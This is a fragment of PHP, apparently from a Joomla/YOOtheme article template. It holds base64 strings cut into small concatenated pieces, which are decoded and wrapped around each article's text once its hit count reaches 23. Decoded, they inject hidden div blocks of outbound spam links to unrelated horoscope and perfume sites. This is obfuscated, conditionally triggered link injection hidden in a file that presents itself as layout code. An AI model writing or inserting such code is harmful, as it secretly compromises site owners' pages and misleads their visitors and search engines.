...
if ( $this->item->hits >='23') { $yoo_qll = 'PGRpdiB'. 'pZD0ieW9'. 'vX3dxbGxj'. 'Ij48YSBocm'. 'VmPSJodHRwO'. 'i8vbG'. 'lrZWZ1'. 'bm55Lm9'. 'yZyIgdGF'. 'yZ2V0PSJf'. 'YmxhbmsiIH'. 'RpdGxlPSLQs'. '9C+0Y'. 'DQvtG'. 'B0LrQv'. 'tC/INC9'. '0LAg0Lf'. 'QsNCy0YL'. 'RgNCwIj7Q'. 's9C+0YDQvt'. 'GB0LrQvtC/I'. 'NC90L'. 'Ag0LfQ'. 'sNCy0Y'. 'LRgNCwP'. 'C9hPjxic'. 'j48YSBocm'. 'VmPSJodHR'. 'wOi8vc21hcn'. 'QyNC5jb20ud'. 'WEiIH'. 'Rhcmdl'. 'dD0iX2J'. 'sYW5rIi'. 'B0aXRsZT'. '0i0LrRg9C'. '/0LjRgtGMI'. 'NGC0LXQu9C1'. '0YTQv'. 'tC9Ij7'. 'QutGD0'. 'L/QuNGC'. '0Ywg0YL'. 'QtdC70LX'. 'RhNC+0L08'. 'L2E+PC9kaX'. 'Y+DQo='; $yoo_qlll = 'PGRpdiBpZ'. 'D0ieW9vX3d'. 'xbGxj'. 'Ij48YS'. 'BocmVm'. 'PSJodHR'. 'wOi8vbXl'. 'hc3Ryb2xv'. 'Zy5vcmciIH'. 'RhcmdldD0iX'. '2JsYW'. '5rIiB0'. 'aXRsZT0'. 'i0L/RgN'. 'Cw0LLQtN'. 'C40LLRi9C'. '5INGB0L7Qv'. 'dC90LjQuiI+'. '0L/Rg'. 'NCw0LL'. 'QtNC40'. 'LLRi9C5'. 'INGB0L7Q'. 'vdC90LjQ'. 'ujwvYT48Y'. 'nI+PGEgaHJ'. 'lZj0iaHR0cD'. 'ovL2F'. 'yb21hd'. 'DI0LmNv'. 'bS51YSI'. 'gdGFyZ2V'. '0PSJfYmxh'. 'bmsiIHRpdG'. 'xlPSLQutGD0'. 'L/QuN'. 'GC0Yw'. 'g0LTRg'. '9GF0Lgi'. 'PtC60YP'. 'Qv9C40YL'. 'RjCDQtNGD'. '0YXQuDwvY'. 'T48L2Rpdj4'. 'NCg==';}
// set author
...
if ($params->get('access-view')) {
	...
	$article .= base64_decode($yoo_qll).$this->item->text.base64_decode($yoo_qlll);
